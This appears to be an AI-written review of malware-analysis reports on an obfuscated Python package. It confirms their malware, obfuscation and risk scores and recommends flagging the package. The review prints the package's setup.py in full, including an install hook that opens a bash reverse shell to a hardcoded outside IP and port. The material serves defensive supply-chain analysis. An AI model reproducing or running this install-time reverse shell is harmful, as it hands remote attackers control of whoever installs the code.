  "review": "Let's analyze each report carefully, verify the technical details, and assess the scoring.\n\n---\n\n**Overall observations:**\n\n- All reports agree that the code executes a reverse shell to IP 114.116.119.253 on port 7888 during package installation.\n- The code is straightforward: it imports setuptools, defines a custom install class, and in `run()`, calls `os.system()` with a bash reverse shell command.\n- The package name appears obfuscated, which is typical for malicious packages.\n- The malware, obfuscated, and security risk scores are consistently high across reports, with some variance.\n\n---\n\n### Confirming the presence of issues in the code:\n\n**Code content:**\n\n```python\nimport setuptools\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation command to run custom code after install.\"\"\"\n\n    def run(self):\n        install.run(self)\n        os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7888 <&1'\")\n        \nsetup(name='exmdga6b3mbrfr6z', version='1.0.0', cmdclass={'install': CustomInstallCommand})\n```\n\n**Findings:**\n\n- The `run()` method executes a reverse shell command via `os.system`.\n- The command is a typical bash reverse shell: `bash -i >& /dev/tcp/IP/PORT <&1`.\n- No other benign code is present.\n- The package name `exmdga6b3mbrfr6z` appears obfuscated.\n\n**Conclusion:** The malicious activity is present and clearly implemented in the code.\n\n---\n\n### Logical errors, flaws, or mistakes in the report:\n\n- The reports are consistent and accurate in identifying malicious behavior.\n- They correctly point out the hardcoded IP, reverse shell command, and the fact that it runs during installation.\n- No logical flaws are evident in the reports' reasoning.\n- The analysis correctly interprets the code's intent as malicious.\n\n---\n\n### Scores assessment:\n\n**Malware score:**\n\n- All reports assign a malware score of 1.0, which is appropriate given the reverse shell payload.\n- The code's behavior is unequivocally malicious.\n\n**Obfuscated score:**\n\n- Reports assign obfuscated scores of 0.7 or 0, depending on their assessment.\n- The package name appears obfuscated, which justifies a higher obfuscation score (around 0.7).\n- The code itself is straightforward, not obfuscated beyond the package name.\n\n**Risk score:**\n\n- All reports give a high security risk (1.0 or 0.9).\n- The behavior—executing a reverse shell during install—is highly dangerous and warrants a maximum or near-maximum score.\n\n**Are these scores reasonable?**\n\n- **Malware:** 1.0 is justified.\n- **Obfuscated:** 0.7 is reasonable, considering the package name.\n- **Risk:** 1.0 is justified due to the malicious payload.\n\n---\n\n### Justification for high risk scores:\n\n- The code executes a reverse shell, which can give remote attackers full control over the host.\n- This is a supply chain attack vector.\n- The package name obfuscation suggests an attempt to evade detection.\n\n---\n\n### Claims based on assumptions:\n\n- The reports assume malicious intent based on the reverse shell code, which is reasonable.\n- No false assumptions are evident; the code's behavior is clearly malicious.\n\n---\n\n### Consistency of scores:\n\n- The scores are consistent with the described behavior.\n- The high malware and risk scores are appropriate.\n- Slight variation in obfuscation scores is acceptable.\n\n---\n\n### Final assessment:\n\n**Based on the code and reports, I would assign:**\n\n- **Malware score:** **1.0** (confirmed malicious payload)\n- **Obfuscated score:** **0.7** (package name obfuscated, code straightforward)\n- **Risk score:** **1.0** (severe security risk due to remote access capability)\n\n---\n\n### Summary:\n\nThe reports correctly identify the malicious behavior, and the scores reflect the severity accurately. The code is clearly malicious, executing a reverse shell during installation, and the package name appears intentionally obfuscated.\n\n---\n\n**Final recommendation:** The package should be flagged as malicious, and its distribution should be halted. Users should be warned against installing such packages.",
